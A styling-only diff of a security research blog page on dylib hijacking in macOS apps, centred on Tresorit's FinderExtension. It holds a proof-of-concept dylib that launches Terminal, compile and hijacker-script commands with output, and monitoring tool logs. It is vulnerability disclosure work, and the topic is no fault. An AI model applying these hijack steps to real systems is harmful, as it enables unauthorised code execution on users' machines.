@@ -48,7 +48,7 @@
 
   
   
-  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.b886fe0d9034709648f91f4ce178f51dd367d9350f82dd1132d54fd69bfca66f.css" integrity="sha256-uIb&#43;DZA0cJZI&#43;R9M4Xj1HdNn2TUPgt0RMtVP1pv8pm8=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.4410e480b3bad72c110a96b56e5aa8c36c24a0f3735b278818123b0fa4393fcd.css" integrity="sha256-RBDkgLO61ywRCpa1blqow2wkoPNzWyeIGBI7D6Q5P80=" crossorigin="anonymous" media="screen" />
 
 
 
@@ -235,26 +235,26 @@ or watch his talk on the subject:
 </ol>
 <p><img src="https://theevilbit.github.io/images/Getting_root_with_benign_AppStore_apps/Screen%20Shot%202018-09-12%20at%2014.05.35.png" alt="image1"></p>
 <p>The vulnerability is with Tresorit’s FinderExtension:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/FinderExtension
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/FinderExtension
 </span></span></code></pre></div><p>And you can place your dylib here:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rpath vulnerability: /Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/Frameworks/UtilsMac.framework/Versions/A/UtilsMac
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rpath vulnerability: /Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/Frameworks/UtilsMac.framework/Versions/A/UtilsMac
 </span></span></code></pre></div><p>DHS will only show you the first hijackable dylib, but there can be more. Set the DYLD_PRINT_RPATHS variable to 1 in Terminal, and you will see which dylibs the loader tries to load. You can see below that we can hijack two dylibs.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ export DYLD_PRINT_RPATHS<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#366">export</span> <span style="color:#033">DYLD_PRINT_RPATHS</span><span style="color:#555">=</span><span style="color:#c30">&#34;1&#34;</span>
 </span></span><span style="display:flex;"><span>$ 
 </span></span><span style="display:flex;"><span>$ /Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/FinderExtension
 </span></span><span style="display:flex;"><span>RPATH failed to expanding     @rpath/UtilsMac.framework/Versions/A/UtilsMac to: /Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/../Frameworks/UtilsMac.framework/Versions/A/UtilsMac
 </span></span><span style="display:flex;"><span>RPATH successful expansion of @rpath/UtilsMac.framework/Versions/A/UtilsMac to: /Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/../../../../Frameworks/UtilsMac.framework/Versions/A/UtilsMac
 </span></span><span style="display:flex;"><span>RPATH failed to expanding     @rpath/MMWormhole.framework/Versions/A/MMWormhole to: /Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/../Frameworks/MMWormhole.framework/Versions/A/MMWormhole
 </span></span><span style="display:flex;"><span>RPATH successful expansion of @rpath/MMWormhole.framework/Versions/A/MMWormhole to: /Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/../../../../Frameworks/MMWormhole.framework/Versions/A/MMWormhole
-</span></span><span style="display:flex;"><span>Illegal instruction: <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>Illegal instruction: <span style="color:#f60">4</span>
 </span></span><span style="display:flex;"><span>$ 
 </span></span></code></pre></div><p>Additionally it’s a good idea to double check if the App is compiled with the library-validation option (flag=0x200). That would mean that the OS will verify if all dylibs are signed or not, so you can’t just create anything and use that. Most of the apps are not compiled this way, including Tresorit (but they promised to fix it):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ codesign -dvvv /Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/FinderExtension
-</span></span><span style="display:flex;"><span>Executable<span style="color:#f92672">=</span>/Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/FinderExtension
-</span></span><span style="display:flex;"><span>Identifier<span style="color:#f92672">=</span>com.tresorit.mac.TresoritExtension.FinderExtension
-</span></span><span style="display:flex;"><span>Format<span style="color:#f92672">=</span>bundle with Mach-O thin <span style="color:#f92672">(</span>x86_64<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>CodeDirectory v<span style="color:#f92672">=</span><span style="color:#ae81ff">20200</span> size<span style="color:#f92672">=</span><span style="color:#ae81ff">754</span> flags<span style="color:#f92672">=</span>0x0<span style="color:#f92672">(</span>none<span style="color:#f92672">)</span> hashes<span style="color:#f92672">=</span>15+5 location<span style="color:#f92672">=</span>embedded
-</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>...<span style="color:#f92672">)</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ codesign -dvvv /Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/FinderExtension
+</span></span><span style="display:flex;"><span><span style="color:#033">Executable</span><span style="color:#555">=</span>/Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/FinderExtension
+</span></span><span style="display:flex;"><span><span style="color:#033">Identifier</span><span style="color:#555">=</span>com.tresorit.mac.TresoritExtension.FinderExtension
+</span></span><span style="display:flex;"><span><span style="color:#033">Format</span><span style="color:#555">=</span>bundle with Mach-O thin <span style="color:#555">(</span>x86_64<span style="color:#555">)</span>
+</span></span><span style="display:flex;"><span>CodeDirectory <span style="color:#033">v</span><span style="color:#555">=</span><span style="color:#f60">20200</span> <span style="color:#033">size</span><span style="color:#555">=</span><span style="color:#f60">754</span> <span style="color:#033">flags</span><span style="color:#555">=</span>0x0<span style="color:#555">(</span>none<span style="color:#555">)</span> <span style="color:#033">hashes</span><span style="color:#555">=</span>15+5 <span style="color:#033">location</span><span style="color:#555">=</span>embedded
+</span></span><span style="display:flex;"><span><span style="color:#555">(</span>...<span style="color:#555">)</span>
 </span></span></code></pre></div><h3 id="utilizing-the-vulnerability">
   Utilizing the vulnerability
   <a class="heading-link" href="#utilizing-the-vulnerability">
@@ -263,41 +263,41 @@ or watch his talk on the subject:
   </a>
 </h3>
 <p>It’s also something that is super easy based on the talk above, but here it is in short. I made the following POC:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;syslog.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__attribute__</span>((constructor))
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">customConstructor</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;stdio.h&gt;</span><span style="color:#099">
+</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;stdlib.h&gt;</span><span style="color:#099">
+</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;syslog.h&gt;</span><span style="color:#099">
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
+</span></span><span style="display:flex;"><span><span style="color:#c0f">__attribute__</span>((constructor))
+</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">customConstructor</span>(<span style="color:#078;font-weight:bold">int</span> argc, <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>argv)
 </span></span><span style="display:flex;"><span> {
-</span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Hello World!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal&#34;</span>);
-</span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">syslog</span>(LOG_ERR, <span style="color:#e6db74">&#34;Dylib hijack successful in %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>     <span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;Hello World!</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>     <span style="color:#c0f">system</span>(<span style="color:#c30">&#34;/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal&#34;</span>);
+</span></span><span style="display:flex;"><span>     <span style="color:#c0f">syslog</span>(LOG_ERR, <span style="color:#c30">&#34;Dylib hijack successful in %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, argv[<span style="color:#f60">0</span>]);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>The constructor will be called upon loading the dylib. It will print you a line, create a syslog entry, and also start Terminal for you. If the app doesn’t run in sandbox you get a full featured Terminal. Compile it:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -dynamiclib hello.c -o hello-tresorit.dylib -Wl,-reexport_library,<span style="color:#e6db74">&#34;/Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/../../../../Frameworks/UtilsMac.framework/Versions/A/UtilsMac&#34;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -dynamiclib hello.c -o hello-tresorit.dylib -Wl,-reexport_library,<span style="color:#c30">&#34;/Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/../../../../Frameworks/UtilsMac.framework/Versions/A/UtilsMac&#34;</span>
 </span></span></code></pre></div><p>Then run Patrick’s fixer script. It will fix the dylib version for you (the dylib loader will verify that when loading) and also will add all the exports that are exported by the original dylib. Those exports will actually point to the valid dylib, so when the application loads our crafted version, it can still use all the functions and won’t crash.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 createHijacker.py hello-tresorit.dylib <span style="color:#e6db74">&#34;/Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/../../../../Frameworks/UtilsMac.framework/Versions/A/UtilsMac&#34;</span>
-</span></span><span style="display:flex;"><span>CREATE A HIJACKER <span style="color:#f92672">(</span>p. wardle<span style="color:#f92672">)</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 createHijacker.py hello-tresorit.dylib <span style="color:#c30">&#34;/Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/../../../../Frameworks/UtilsMac.framework/Versions/A/UtilsMac&#34;</span>
+</span></span><span style="display:flex;"><span>CREATE A HIJACKER <span style="color:#555">(</span>p. wardle<span style="color:#555">)</span>
 </span></span><span style="display:flex;"><span>configures an attacker supplied .dylib to be compatible with a target hijackable .dylib
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> configuring hello-tresorit.dylib to hijack UtilsMac
-</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> parsing <span style="color:#e6db74">&#39;UtilsMac&#39;</span> to extract version info
-</span></span><span style="display:flex;"><span>     found <span style="color:#e6db74">&#39;LC_ID_DYLIB&#39;</span> load command at offset<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>: <span style="color:#f92672">[</span>2568<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> <span style="color:#555">[</span>+<span style="color:#555">]</span> configuring hello-tresorit.dylib to hijack UtilsMac
+</span></span><span style="display:flex;"><span> <span style="color:#555">[</span>+<span style="color:#555">]</span> parsing <span style="color:#c30">&#39;UtilsMac&#39;</span> to extract version info
+</span></span><span style="display:flex;"><span>     found <span style="color:#c30">&#39;LC_ID_DYLIB&#39;</span> load <span style="color:#366">command</span> at offset<span style="color:#555">(</span>s<span style="color:#555">)</span>: <span style="color:#555">[</span>2568<span style="color:#555">]</span>
 </span></span><span style="display:flex;"><span>     extracted current version: 0x10000
 </span></span><span style="display:flex;"><span>     extracted compatibility version: 0x10000
-</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> parsing <span style="color:#e6db74">&#39;hello-tresorit.dylib&#39;</span> to find version info
-</span></span><span style="display:flex;"><span>     found <span style="color:#e6db74">&#39;LC_ID_DYLIB&#39;</span> load command at offset<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>: <span style="color:#f92672">[</span>888<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> updating version info in hello-tresorit.dylib to match UtilsMac
-</span></span><span style="display:flex;"><span>     setting version info at offset <span style="color:#ae81ff">888</span>
-</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> parsing <span style="color:#e6db74">&#39;hello-tresorit.dylib&#39;</span> to extract faux re-export info
-</span></span><span style="display:flex;"><span>     found <span style="color:#e6db74">&#39;LC_REEXPORT_DYLIB&#39;</span> load command at offset<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>: <span style="color:#f92672">[</span>1144<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>     extracted LC command size: 0x48
+</span></span><span style="display:flex;"><span> <span style="color:#555">[</span>+<span style="color:#555">]</span> parsing <span style="color:#c30">&#39;hello-tresorit.dylib&#39;</span> to find version info
+</span></span><span style="display:flex;"><span>     found <span style="color:#c30">&#39;LC_ID_DYLIB&#39;</span> load <span style="color:#366">command</span> at offset<span style="color:#555">(</span>s<span style="color:#555">)</span>: <span style="color:#555">[</span>888<span style="color:#555">]</span>
+</span></span><span style="display:flex;"><span> <span style="color:#555">[</span>+<span style="color:#555">]</span> updating version info in hello-tresorit.dylib to match UtilsMac
+</span></span><span style="display:flex;"><span>     setting version info at offset <span style="color:#f60">888</span>
+</span></span><span style="display:flex;"><span> <span style="color:#555">[</span>+<span style="color:#555">]</span> parsing <span style="color:#c30">&#39;hello-tresorit.dylib&#39;</span> to extract faux re-export info
+</span></span><span style="display:flex;"><span>     found <span style="color:#c30">&#39;LC_REEXPORT_DYLIB&#39;</span> load <span style="color:#366">command</span> at offset<span style="color:#555">(</span>s<span style="color:#555">)</span>: <span style="color:#555">[</span>1144<span style="color:#555">]</span>
+</span></span><span style="display:flex;"><span>     extracted LC <span style="color:#366">command</span> size: 0x48
 </span></span><span style="display:flex;"><span>     extracted path offset: 0x18
 </span></span><span style="display:flex;"><span>     computed path size: 0x30
 </span></span><span style="display:flex;"><span>     extracted faux path: @rpath/UtilsMac.framework/Versions/A/UtilsMac
-</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> updating embedded re-export via exec<span style="color:#960050;background-color:#1e0010">&#39;</span>ing: /usr/bin/install_name_tool -change
-</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> copying configured .dylib to /Users/csaby/Downloads/DylibHijack/UtilsMac
+</span></span><span style="display:flex;"><span> <span style="color:#555">[</span>+<span style="color:#555">]</span> updating embedded re-export via exec<span style="color:#a00;background-color:#faa">&#39;</span>ing: /usr/bin/install_name_tool -change
+</span></span><span style="display:flex;"><span> <span style="color:#555">[</span>+<span style="color:#555">]</span> copying configured .dylib to /Users/csaby/Downloads/DylibHijack/UtilsMac
 </span></span></code></pre></div><p>Once that is done, you can just copy the file over and start the app.</p>
 <h3 id="other-apps">
   Other apps
@@ -348,49 +348,49 @@ It’s quite good!</p>
   </a>
 </h3>
 <p>This is an open source library for monitoring process creation and termination on macOS. I used the demo project of this library, called ProcInfoExample. It’s a command line utility and will log every process creation, with all the related details, like arguments, signature info, etc… It will give you more information than FE’s Monitor app. It’s output is like:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2019-03-11 21:18:05.770 procInfoExample<span style="color:#f92672">[</span>32903:4117446<span style="color:#f92672">]</span> process start:
-</span></span><span style="display:flex;"><span>pid: <span style="color:#ae81ff">32906</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2019-03-11 21:18:05.770 procInfoExample<span style="color:#555">[</span>32903:4117446<span style="color:#555">]</span> process start:
+</span></span><span style="display:flex;"><span>pid: <span style="color:#f60">32906</span>
 </span></span><span style="display:flex;"><span>path: /System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/Resources/efw_cache_update
-</span></span><span style="display:flex;"><span>user: <span style="color:#ae81ff">0</span>
-</span></span><span style="display:flex;"><span>args: <span style="color:#f92672">(</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;/System/Library/PrivateFrameworks/PackageKit.framework/Resources/efw_cache_update&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;/var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/C/PKInstallSandboxManager/BC005493-3176-43E4-A1F0-82D38C6431A3.activeSandbox/Root/Applications/Parcel.app&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>ancestors: <span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>user: <span style="color:#f60">0</span>
+</span></span><span style="display:flex;"><span>args: <span style="color:#555">(</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c30">&#34;/System/Library/PrivateFrameworks/PackageKit.framework/Resources/efw_cache_update&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#c30">&#34;/var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/C/PKInstallSandboxManager/BC005493-3176-43E4-A1F0-82D38C6431A3.activeSandbox/Root/Applications/Parcel.app&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">)</span>
+</span></span><span style="display:flex;"><span>ancestors: <span style="color:#555">(</span>
 </span></span><span style="display:flex;"><span>    9103,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span> signing info: <span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>    signatureAuthorities <span style="color:#f92672">=</span>     <span style="color:#f92672">(</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Software Signing&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Apple Code Signing Certification Authority&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Apple Root CA&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">)</span>;
-</span></span><span style="display:flex;"><span>    signatureIdentifier <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;com.apple.efw_cache_update&#34;</span>;
-</span></span><span style="display:flex;"><span>    signatureSigner <span style="color:#f92672">=</span> 1;
-</span></span><span style="display:flex;"><span>    signatureStatus <span style="color:#f92672">=</span> 0;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f60">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">)</span>
+</span></span><span style="display:flex;"><span> signing info: <span style="color:#555">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#033">signatureAuthorities</span> <span style="color:#555">=</span>     <span style="color:#555">(</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c30">&#34;Software Signing&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#c30">&#34;Apple Code Signing Certification Authority&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#c30">&#34;Apple Root CA&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#555">)</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#033">signatureIdentifier</span> <span style="color:#555">=</span> <span style="color:#c30">&#34;com.apple.efw_cache_update&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#033">signatureSigner</span> <span style="color:#555">=</span> 1;
+</span></span><span style="display:flex;"><span>    <span style="color:#033">signatureStatus</span> <span style="color:#555">=</span> 0;
+</span></span><span style="display:flex;"><span><span style="color:#555">}</span>
 </span></span><span style="display:flex;"><span> binary:
 </span></span><span style="display:flex;"><span>name: efw_cache_update
 </span></span><span style="display:flex;"><span>path: /System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/Resources/efw_cache_update
-</span></span><span style="display:flex;"><span>attributes: <span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>    NSFileCreationDate <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;2018-11-30 07:31:32 +0000&#34;</span>;
-</span></span><span style="display:flex;"><span>    NSFileExtensionHidden <span style="color:#f92672">=</span> 0;
-</span></span><span style="display:flex;"><span>    NSFileGroupOwnerAccountID <span style="color:#f92672">=</span> 0;
-</span></span><span style="display:flex;"><span>    NSFileGroupOwnerAccountName <span style="color:#f92672">=</span> wheel;
-</span></span><span style="display:flex;"><span>    NSFileHFSCreatorCode <span style="color:#f92672">=</span> 0;
-</span></span><span style="display:flex;"><span>    NSFileHFSTypeCode <span style="color:#f92672">=</span> 0;
-</span></span><span style="display:flex;"><span>    NSFileModificationDate <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;2018-11-30 07:31:32 +0000&#34;</span>;
-</span></span><span style="display:flex;"><span>    NSFileOwnerAccountID <span style="color:#f92672">=</span> 0;
-</span></span><span style="display:flex;"><span>    NSFileOwnerAccountName <span style="color:#f92672">=</span> root;
-</span></span><span style="display:flex;"><span>    NSFilePosixPermissions <span style="color:#f92672">=</span> 493;
-</span></span><span style="display:flex;"><span>    NSFileReferenceCount <span style="color:#f92672">=</span> 1;
-</span></span><span style="display:flex;"><span>    NSFileSize <span style="color:#f92672">=</span> 43040;
-</span></span><span style="display:flex;"><span>    NSFileSystemFileNumber <span style="color:#f92672">=</span> 4214431;
-</span></span><span style="display:flex;"><span>    NSFileSystemNumber <span style="color:#f92672">=</span> 16777220;
-</span></span><span style="display:flex;"><span>    NSFileType <span style="color:#f92672">=</span> NSFileTypeRegular;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>signing info: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>attributes: <span style="color:#555">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#033">NSFileCreationDate</span> <span style="color:#555">=</span> <span style="color:#c30">&#34;2018-11-30 07:31:32 +0000&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#033">NSFileExtensionHidden</span> <span style="color:#555">=</span> 0;
+</span></span><span style="display:flex;"><span>    <span style="color:#033">NSFileGroupOwnerAccountID</span> <span style="color:#555">=</span> 0;
+</span></span><span style="display:flex;"><span>    <span style="color:#033">NSFileGroupOwnerAccountName</span> <span style="color:#555">=</span> wheel;
+</span></span><span style="display:flex;"><span>    <span style="color:#033">NSFileHFSCreatorCode</span> <span style="color:#555">=</span> 0;
+</span></span><span style="display:flex;"><span>    <span style="color:#033">NSFileHFSTypeCode</span> <span style="color:#555">=</span> 0;
+</span></span><span style="display:flex;"><span>    <span style="color:#033">NSFileModificationDate</span> <span style="color:#555">=</span> <span style="color:#c30">&#34;2018-11-30 07:31:32 +0000&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#033">NSFileOwnerAccountID</span> <span style="color:#555">=</span> 0;
+</span></span><span style="display:flex;"><span>    <span style="color:#033">NSFileOwnerAccountName</span> <span style="color:#555">=</span> root;
+</span></span><span style="display:flex;"><span>    <span style="color:#033">NSFilePosixPermissions</span> <span style="color:#555">=</span> 493;
+</span></span><span style="display:flex;"><span>    <span style="color:#033">NSFileReferenceCount</span> <span style="color:#555">=</span> 1;
+</span></span><span style="display:flex;"><span>    <span style="color:#033">NSFileSize</span> <span style="color:#555">=</span> 43040;
+</span></span><span style="display:flex;"><span>    <span style="color:#033">NSFileSystemFileNumber</span> <span style="color:#555">=</span> 4214431;
+</span></span><span style="display:flex;"><span>    <span style="color:#033">NSFileSystemNumber</span> <span style="color:#555">=</span> 16777220;
+</span></span><span style="display:flex;"><span>    <span style="color:#033">NSFileType</span> <span style="color:#555">=</span> NSFileTypeRegular;
+</span></span><span style="display:flex;"><span><span style="color:#555">}</span>
+</span></span><span style="display:flex;"><span>signing info: <span style="color:#555">(</span>null<span style="color:#555">)</span> 
 </span></span></code></pre></div><h3 id="built-in-fs_usage-utility">
   Built-in fs_usage utility
   <a class="heading-link" href="#built-in-fs_usage-utility">
@@ -399,14 +399,14 @@ It’s quite good!</p>
   </a>
 </h3>
 <p>The <code>fs_usage</code> utility can monitor file system event very detailed, I would say even too detailed, you need to do some good filtering if you want to get useful data out of it. You get something like this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>standard input<span style="color:#f92672">)</span>:21:27:01.229709  getxattr               <span style="color:#f92672">[</span> 93<span style="color:#f92672">]</span>           /Applications/Parcel.app                                                                                                                                              0.000017   lsd.4123091
-</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>standard input<span style="color:#f92672">)</span>:21:27:01.229719  access                       <span style="color:#f92672">(</span>___F<span style="color:#f92672">)</span>    /Applications/Parcel.app/Contents                                                                                                                                     0.000005   lsd.4123091
-</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>standard input<span style="color:#f92672">)</span>:21:27:01.229819  fstatat64                              <span style="color:#f92672">[</span>-2<span style="color:#f92672">]</span>//Applications/Parcel.app                                                                                                                                         0.000013   lsd.4123091
-</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>standard input<span style="color:#f92672">)</span>:21:27:01.229927  getattrlist                            /Applications/Parcel.app                                                                                                                                              0.000006   lsd.4123091
-</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>standard input<span style="color:#f92672">)</span>:21:27:01.229933  getattrlist                            /Applications/Parcel.app/Contents                                                                                                                                     0.000006   lsd.4123091
